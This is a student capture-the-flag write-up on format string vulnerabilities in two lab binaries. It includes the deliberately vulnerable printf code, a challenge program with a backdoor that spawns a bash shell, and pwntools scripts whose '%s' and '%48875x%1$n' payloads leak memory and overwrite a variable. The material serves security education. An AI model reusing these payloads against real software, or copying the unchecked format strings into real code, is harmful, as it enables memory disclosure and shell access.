# Week 7: CTF

## Goal

> Explore format string vulnerabilities.

### Challenge 1

> First we started by running checksec in our program to see it´s protections.

```bash
/home/seed/Documents/CTF/semana7/desafio1/program'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

> We noticed that there is no PIE (which provides randomization of addresses) so we are able to perform a string format exploit if we have a vulnerability in the program.

```c
    load_flag();
   
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%32s", &buffer);
    printf("You gave me this: ");
    printf(buffer); //this line has the vulnerability
```

> The vulnerability results from the printf not specifying the format string, therefore it will accept any content. Because we control the buffer variable, we can control this format string to perform an exploit.
>
> Since there is no PIE we can discover the position in memory of the flag buffer because it will not change in different runs. To discover this position we used gdb:

```bash
gdb-peda$ p &flag
$1 = (char (*)[40]) 0x804c060 <flag>
```

> Now we need to discover, like in the logbooks, the offset between the format string pointer and the buffer location in memory. To discover this offset we injected in the beginning of the payload a number followed by multiple "%x", then we expected to find this number in the result so that we know that we have enough "%x" to reach the buffer position.  
>
> In this case, contrarily to the seed labs, it prints the number immediately which means that the buffer is stored right after the pointer to the format string.
>
> This is a simple read problem because the offset is 0, so we just need to "%s" at the right position of the memory:

```python
from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4004)

p.recvuntil(b"got:")
p.sendline(b"\x60\xc0\x04\x08%s\n")
p.interactive()
```

### Challenge 2

> First we started by running checksec in our program to see it´s protections.

```bash
/home/seed/Documents/CTF/semana7/desafio2/program'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

> This program has the same restrictions of the first challenge so a format string exploit is still possible. However as we can see by the code the flag is not loaded into memory so we need another method to get the flag value.

```c
#include <stdio.h>
#include <stdlib.h>

int key = 0;

int main() {
   
    char buffer[32];

    printf("There is nothing to see here...");
    fflush(stdout);
    scanf("%32s", &buffer);
    printf("You gave me this:");
    printf(buffer); //this line still has the vulnerability
    fflush(stdout);

    if(key == 0xbeef) {
        printf("Backdoor activated\n");
        fflush(stdout);
        system("/bin/bash");    
    }
        
    return 0;
}
```

> The vulnerability is the same as in challenge 1 : a printf without a format string specified whose arguments are directly controlled by the user input who can then use it to perform an exploit.
>
> We will want to have the key variable equal to 0xbeef so we can enter the if statement and a shell be launched. After that we can use the shell to access the flag.txt file.
> Since we wanted to change the key variable we used, like in challenge 1, gdb to find it's position in memory.

```bash
gdb-peda$ p &key
$1 = (int *) 0x804c034 <key>
```

> This means the key variable is in address 0x804c034 and to change it's value we need to execute a "%n" format string exploit.
> Just like in challenge 1 , we discovered the offset between the format string pointer and the key variable with "%x" and conclude the same, the offset was 0.
>
> To change the key variable value we need to user "%n" because it writes in the memory address passed the number of characters we have written so far in our string.
> Since 0xbeef is equal to 48879 , to modify the value of the key to this we need to use %n specifier and inject previously 48879 chars in the payload.
> The problem is that our buffer is only 32 bits so wee nee to find a solution.
>
> The solution was found while browsing the web and discovering that we can use this way of specifying "%n" as "amount of charsx%1$n" because this will not be taken into account for the 32 bytes. Also because writing the key memory address takes 4 bytes then we just need to insert more 48875 bytes to make the sum 48879(0xbeef).

```python
from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4005)

p.sendline(b"\x34\xc0\x04\x08%48875x%1$n")
p.interactive()
```

> After this, as expected, a shell was launched and to get the flag we just needed to run:

```bash
cat flag.txt
```
